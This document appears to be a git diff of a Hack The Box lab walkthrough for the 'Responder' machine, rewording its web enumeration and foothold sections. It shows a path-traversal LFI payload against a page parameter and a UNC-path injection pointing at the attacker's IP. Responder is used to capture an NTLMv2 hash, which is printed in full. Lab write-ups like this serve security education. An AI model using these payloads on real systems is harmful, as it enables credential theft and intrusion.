@@ -74,71 +74,48 @@ Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 20
 
 ### 1.2 Web Enumeration
 
-In our machine, Added the target to `/etc/hosts` for hostname resolution:
-
-```bash
-echo "10.129.86.157 unika.htb" | sudo tee -a /etc/hosts
-```
-
-Then, we'll browsing to `http://unika.htb` revealed a business website with multi-language support. Switching the language changed the URL to:
-
+Initially, navigating to the target IP `http://10.129.86.157` on port 80 automatically redirects to `http://unika.htb`, revealing a website for a company named "UNIKA". While exploring the site, clicking the language toggle button to switch from English (EN) to German (DE) reveals a new URL:
 ```
 http://unika.htb/index.php?page=german.html
 ```
+This exposes a `page` parameter directly loads files from disk, and testing it uncovered a **Local File Inclusion (LFI)** vulnerability.
 
-The `page` parameter directly loads files from disk — a classic indicator of **Local File Inclusion**.
 
 ---
 
-## 🚪 2: Initial Foothold — LFI
+## 🚪 2: Initial Foothold
 
-**Vulnerability:** `Local File Inclusion (LFI)`
+**Vulnerability Identifiaed:** *Local File Inclusion (LFI) leading to NTLM Hash Theft.*
 
-### Exploit Steps
 
-1. Tested the `page` parameter with a path traversal payload targeting a known Windows system file:
+We can test the `page` parameter with a path traversal payload targeting a known Windows system file:
 
 ```
 http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts
 ```
+The server returned the raw contents of the Windows `hosts` file (**LFI confirmed**).
 
-2. The server returned the raw contents of the Windows `hosts` file — **LFI confirmed**.
+For me, instead of merely reading local files, an LFI vulnerability on a Windows environment can be exploited to force the target server to authenticate against an external **remote SMB share**.
 
-> ✅ **Result:** Arbitrary file read achieved on the remote Windows host via path traversal.
+* First, `Responder` tool was started on the attacker's machine to listen for incoming authentication requests on the VPN interface:
 
----
-
-## 📡 3: NTLM Hash Capture via Responder
-
-**Vulnerability:** `UNC Path Injection → NTLM Relay`
-
-### How It Works
-
-Windows will automatically attempt **SMB authentication** when asked to access a UNC path (e.g. `\\attacker-ip\share`). By injecting a UNC path through the LFI parameter, we can force the server to authenticate against our machine and capture the **NTLMv2 hash** in transit.
-
-### Exploit Steps
-
-1. Start **Responder** on the VPN interface to intercept SMB authentication:
-
-```bash
+```
 sudo responder -I tun0
 ```
 
-2. Trigger the NTLM authentication by injecting the attacker's IP as a UNC path via the LFI:
+* Next, an HTTP payload was sent to the vulnerable `page` parameter, directing the target to fetch a non-existent file from the attacker's IP address:
 
 ```
-http://unika.htb/index.php?page=//10.10.16.90/somefile
+[http://unika.htb/index.php?page=//10.10.16.90/somefile
 ```
 
-3. Responder captures the NTLMv2 hash:
+* `Responder` successfully intercepted the authentication attempt and captured the `NTLMv2-SSP Hash` for the `RESPONDER\Administrator` user🚀
 
 ```
 [SMB] NTLMv2-SSP Client   : 10.129.86.157
 [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
-[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:2b60d05a1cdd0186:D1A0A2C82CFEB8994...
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:2b60d05a1cdd0186:D1A0A2C82CFEB89948FCBAF2A7738FAE:01010000000000008039D9596FCFDC0161422D9A8536C900000000000200080058005A0056004C0001001E00570049004E002D003100520056004600410051005A0043004D003400550004003400570049004E002D003100520056004600410051005A0043004D00340055002E0058005A0056004C002E004C004F00430041004C000300140058005A0056004C002E004C004F00430041004C000500140058005A0056004C002E004C004F00430041004C00070008008039D9596FCFDC0106000400020000000800300030000000000000000100000000200000383275B506F5F720ED98591AD62F76890BFDF34DA14E418A4A2B8ACF1D4D80CC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00390030000000000000000000
 ```
-
-> ✅ **Result:** NTLMv2 hash for `RESPONDER\Administrator` successfully captured.
 
 ---
 
